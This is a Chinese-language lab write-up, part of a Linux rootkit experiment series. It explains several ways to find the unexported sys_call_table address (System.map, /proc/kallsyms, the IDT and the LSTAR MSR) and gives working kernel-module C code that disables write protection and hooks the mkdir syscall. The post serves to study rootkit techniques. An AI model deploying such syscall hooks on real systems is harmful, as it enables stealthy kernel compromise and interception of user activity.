---
category: rootkit
title: Linux Rootkit 实验 | 0004 另外几种系统调用挂钩技术
---

# {{ page.title }}

> 而今忘却来时路，江山暮，天涯目送飞鸿去。

## 实验说明

本次实验接 [0001 实验](https://brant-ruan.github.io/sec/2017/05/08/LinuxRootkitExp-0001.html)，继续探究系统调用挂钩的方法。核心是获得`sys_call_table`的起始地址。这是因为在`2.6`及以后版本的内核中，`sys_call_table`不再作为导出符号，这意味着我们必须自己获取它的地址。有了地址，挂钩就非常容易了。

实验方法如下：

- 通过`/boot/System.map`获得`sys_call_table`地址
- 通过`/proc/kallsyms`获得`sys_call_table`地址
- 通过`IDT`获得`sys_call_table`地址

本次实验暂不涉及 Linux 系统调用的背景知识。

## 实验环境

`System.map/kallsyms`方法及`IDT`方法②环境：

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

`IDT`方法①环境：

```
uname -a
Linux VM-33-172-ubuntu 3.13.0-36-generic #63-Ubuntu SMP Wed Sep 3 21:30:45 UTC 2014 i686 i686 i686 GNU/Linux

GCC version:4.8.4
```

注：`IDT`环境为`32位`系统，这是因为在`64位`系统上系统调用的方式是`syscall`。具体参见【参考资料】二。

## 实验过程

[0001 实验](https://brant-ruan.github.io/sec/2017/05/08/LinuxRootkitExp-0001.html)是通过暴力搜索内存空间来寻找`sys_call_table`的地址。那种方法可能会被欺骗。当然，没有完美的攻击方法，所以这里再学习几种其他的寻找方法。

#### 一　借助 /boot/System.map

这种方法非常易于操作。我们先看结果再深入介绍`System.map`。

通过查询`System.map`获取`sys_call_table`地址：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-37.png)

可以看到这里用`sys_call_table`和`ia32_sys_call_table`两个表。第一个是 64 位系统本身的系统调用表，第二个表是为了兼容 32 位程序通过`int 0x80`方式做系统调用而存在的。为避免一下子讲解过多背景知识，我将采取“知识屏蔽”方法，这里先关注`sys_call_table`，即 64 位系统调用表。

找到了地址，下面就是编码了：

{% highlight c %}
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <asm/current.h>

#define SYS_CALL_TABLE  0xffffffff816001a0

unsigned long *real_sys_call_table = (unsigned long *)SYS_CALL_TABLE;

asmlinkage long (*real_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage long fake_mkdir(const char __user *pathname, umode_t mode)
{
    printk("br: mkdir-%s\n", pathname);

    return (*real_mkdir)(pathname, mode);
}

static int lkm_init(void)
{
    write_cr0(read_cr0() & (~0x10000));
    real_mkdir = (void *)real_sys_call_table[__NR_mkdir];
    real_sys_call_table[__NR_mkdir] = (unsigned long)fake_mkdir;
    write_cr0(read_cr0() | 0x10000);

    printk("bt: module loaded\n");

    return 0;
}

static void lkm_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    real_sys_call_table[__NR_mkdir] = (unsigned long)real_mkdir;
    write_cr0(read_cr0() | 0x10000);

    printk("bt: module removed\n");
}
{% endhighlight %}

针对代码有几点说明：

- 本代码中采用了硬编码方式，把地址写在了宏定义中。一种更好的想法是在运行时通过这种途径获取到地址，这需要了解 /boot/System.map 的形成机制；或者在目标机器上获取到地址后，给已经做好的`.ko`文件进行二进制补丁
- 上面 arciryas 师傅的写保护开关比 novice 师傅的简洁一些，可以参考一下

测试结果如下：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-36.png)

可以看到，挂钩成功。

#### 二 借助 /proc/kallsyms

这里的操作也非常简单，我只展示一下寻找地址的过程：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-38.png)

后面的测试部分同上一小节。

**解读 /boot/System.map 与 /proc/kallsyms**

主要学习自【参考资料】七。

内核喜欢地址，但人更喜欢符号。所以需要一个类似`DNS`的东西来将符号与地址之间做转换。有两个文件扮演符号表的角色：

- /boot/System.map-$(uname -r)

它包含整个内核镜像的符号表。

- /proc/kallsyms

它不仅包含内核镜像符号表，还包含所有动态加载模块的符号表（如果一个函数被编译器内联（inline）或者优化掉了，则它在/proc/kallsyms有可能找不到）。

有趣的是，普通用户无权限查看`/boot/System.map-$(uname -r)`，却有权限看`/proc/kallsyms`。不过，普通用户看到的`/proc/kallsyms`中地址全是零。另外，[这篇文章](http://freenix.blogcn.com/articles/kallsyms-%E5%85%A80%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html)的作者遇到了即使是`root`看到也是全零的情况，原来是需要`echo 0 > /proc/sys/kernel/kptr_restrict`，然而我这里并不需要。

我们知道，`/proc`是一个虚拟出来的东西，故`kallsyms`并不是磁盘上真实存在的文件。它是在被读取时动态生成的，对于现运行的内核来说，它总是正确反映其情况。而`System.map`则是在内核编译完成后就生成的真实文件。所以如果你编译运行了新内核，要用新内核的`System.map`去替换掉旧的。

我们举一个使用`System.map`的例子：

内核引用了一个无效指针时，会出现一个`Oops`。此时系统会给出用于调试的相关信息。但是它给出的是地址而非符号，这给调试人员带来了不便。Linux 有一个后台程序`klogd`截取内核`Oops`信息，并通过`syslogd`记录下来，再将那些人类不敏感的地址转换为人类更感兴趣的符号。它有两种转换方式：静态转换和动态转换。静态转换通过查询`System.map`完成，动态转换用于可加载模块，但不使用`System.map`。

“当`CONFIG_KALLSYMS`激活时，核心会自行做位置到名称的转换，所以像是`ksymoops`这一类的工具并不是必要的”。

`System.map`内容格式如下：

|地址|类型|符号|
|:-:|:-:|:-:|
|c1665140|R|sys_call_table|

`nm`工具列出了目标文件的符号。`System.map`直接与其相关（它是由`nm`针对内核本身产生的）。

部分类型解释如下：

|类型|解释|类型|解释|
|:-:|:-:|:-:|:-:|
|A|绝对的|B/b|未初始化的数据段|
|D/d|已初始化的数据段|G/g|小目标的已初始化数据段（全域）|
|i|特定的DLL段|N|除错符号|
|p|堆栈展开段|R/r|只读数据段|
|S/s|小目标的未初始化数据段|T/t|代码段|
|U|未定义|V/v|弱符号|
|?|符号类型未知|-|a.out目标文件的符号戳|

从`2.6`某个版本开始，内核引入了导出符号的机制。只有在内核中使用`EXPORT_SYMBOL`或`EXPORT_SYMBOL_GPL`导出的符号才能在内核模块中直接使用。然而，内核并没有导出所有的符号。例如，在3.8.0的内核中，do_page_fault就没有被导出。

然而，借助`/proc/kallsyms`可以获取内核未导出符号的地址。比如：

```
cat /proc/kallsyms | grep "\<do_page_fault\>" | awk '{print $1}'
```

关于`kallsyms`机制更详细的内容，可以参考【参考资料】六。

在学习这部分知识时遇到了`kprobe`，挺有趣的样子，未来再看吧。

#### 三　借助 IDT ①

`IDT`即`Interrupt Descriptor Table`。作用类似于系统调用表，将异常或中断向量与对应的处理过程联系起来。我们知道，中断比系统调用低一层级，毕竟系统调用算是一个`0x80`中断。另外，还有一种通过`sysenter`做系统调用的方法，暂时不去管它。

简单过一下系统调用对应的中断过程：

```
用户把参数放入寄存器
用户`int 0x80`
系统处理中断，找到对应的中断处理函数`system_call`
`system_call`执行，做一些处理后，进行`call sys_call_table(,eax, 4)`
中断结束后，恢复到用户态
```

我们寻找`sys_call_table`的思路是：

```
通过`sidt`指令，得到`IDT`
在`IDT`中找到`0x80`中断对应的`system_call`地址
从`system_call`的起始地址去搜索硬编码`\xff\x14\x85`，`x86`汇编中`call`指令的二进制即`\xff\x14\x85`
```

首先介绍一下相关数据结构：

{% highlight c %}
struct {
	unsigned short size;
	unsigned int addr;
}__attribute__((packed)) idtr;

struct {
	unsigned short offset_1;  /*offset bits 0..15*/
	unsigned short selector;  /*a code segment selector in GDT or LDT*/
	unsigned char zero;       /*unused, set to 0*/
	unsigned char type_attr;  /*type and attributes*/
	unsigned short offset_2;  /*offset bits 16..31*/
}__attribute__((packed)) idt;
{% endhighlight %}

`idtr`即`Interrupt Descriptor Table Register`，用来定位`IDT`的位置。我们将使用`sidt`指令将`IDTR`寄存器的内容加载到我们的结构体`idtr`中。之后，将`IDT`存储到我们的结构体`idt`中。

下面就是模块代码了：

{% highlight c %}
unsigned long  *find_sys_call_table(void)
{
	unsigned int sys_call_off;
	char *p;
	int i;
	unsigned int ret;
	asm("sidt %0":"=m"(idtr));
	printk("br: idt table-0x%x\n", idtr.addr);
	memcpy(&idt, idtr.addr+8*0x80, sizeof(idt));
	sys_call_off = ((idt.offset_2 << 16) | idt.offset_1);
	p = sys_call_off;
	for(i = 0; i < 100; i++){
		if(p[i] == '\xff' && p[i+1] == '\x14' && p[i+2] == '\x85')
			ret = *(unsigned int *)(p + i + 3);
	}

	printk("br: sys_call_table-0x%x\n", ret);
	return (unsigned long**)ret;
}
{% endhighlight %}

获取`sys_call_table`地址后同样挂钩`mkdir`，测试结果如下：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-35.png)

#### 四 借助 IDT ②

`x64`汇编中`call`指令的二进制是`\xff\x14\xc5`。

之前提到，`x64`机器上为了兼容`x86`的方式，存在两个系统调用表：

```
sys_call_table
ia32_sys_call_table
```

**搜索 sys_call_table**

学习自【参考资料】五。代码如下：

{% highlight c %}
#include <linux/module.h>

#define IA32_LSTAR  0xc0000082

void *get_sys_call_table(void) {
    void *system_call;
    unsigned char *ptr;
    int i, low, high;

    asm("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));
    system_call = (void*)(((long)high<<32) | low);
    printk(KERN_INFO "system_call: 0x%p", system_call);
    for (ptr=system_call, i=0; i<500; i++) {
        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
            return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
        ptr++;
    }
    return NULL;
}
static int __init sct_init(void) {
    printk(KERN_INFO "sys_call_table: 0x%p", get_sys_call_table());
    return 0;
}

static void __exit sct_exit(void) {
}

module_init(sct_init);
module_exit(sct_exit);
MODULE_LICENSE("GPL");
{% endhighlight %}

可以看到，与`x86`上的主要区别在于：

- 作者的汇编指令用的是`rdmsr`

`MSR - Model Specific Register`是一组反映 CPU 状态的寄存器。可以通过`rdmsr`/`wrmsr`读写。

64 位系统调用用的是`syscall`和`sysret`指令。在 Intel 手册中对此进行了描述：

```
SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR (after saving the address of the instruction following SYSCALL into RCX).
```

也就是说，为了让内核接收到系统调用，内核必须向`IA32_LSTAR` MSR 寄存器注册当系统调用触发时要执行的代码地址。

所以，作者通过一句

```
asm("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));
```

就把`syscall`函数地址从`IA32_LSTAR` MSR 中读了出来。

- call 的机器码是 \xff\x14\xc5

之后的操作就与①实验没大的区别了。

测验结果：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-39.png)

**搜索 ia32_sys_call_table**

暂略。

## 实验问题

**问题一**

对于`ia32_sys_call_table`的理解还不是很透彻。

## 参考资料

- [Linux Rootkit 系列四：对于系统调用挂钩方法的补充](http://www.freebuf.com/articles/system/108392.html)
- [Arciryas/rootkit-sample-code](https://github.com/Arciryas/rootkit-sample-code)
- [Linux System Call Table for x86 64](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [linux的64位操作系统对32位程序的兼容-全面分析](http://blog.csdn.net/dog250/article/details/6221831)
- [articles/kernel_mode_hooking/sources/](https://github.com/oblique/articles/tree/master/kernel_mode_hooking/sources)
- [linux内核kallsyms机制分析](http://blog.chinaunix.net/uid-27717694-id-3985448.html)
- [The system.map File](http://rlworkman.net/system.map/)
- [维基百科：System.map](https://zh.wikipedia.org/wiki/System.map)
- [Linux kernel 笔记 （37）——”system.map”和“/proc/kallsyms”](http://nanxiao.me/linux-kernel-note-37-system-map-and-proc-kallsyms/)
- [获取Linux内核未导出符号的几种方式](http://www.cnblogs.com/richardustc/archive/2013/04/25/3043674.html)
- [x86 Instruction Set Reference SIDT](http://x86.renejeschke.de/html/file_module_x86_id_295.html)
- [Obtain sys_call_table on amd64 (x86_64)](https://www.exploit-db.com/papers/13146/)
- [SYSCALL—Fast System Call](http://www.felixcloutier.com/x86/SYSCALL.html)
- [RDMSR—Read from Model Specific Register](http://www.felixcloutier.com/x86/RDMSR.html)
- [Linux 系统调用权威指南](https://juejin.im/entry/570895d67db2a20051cc7873)
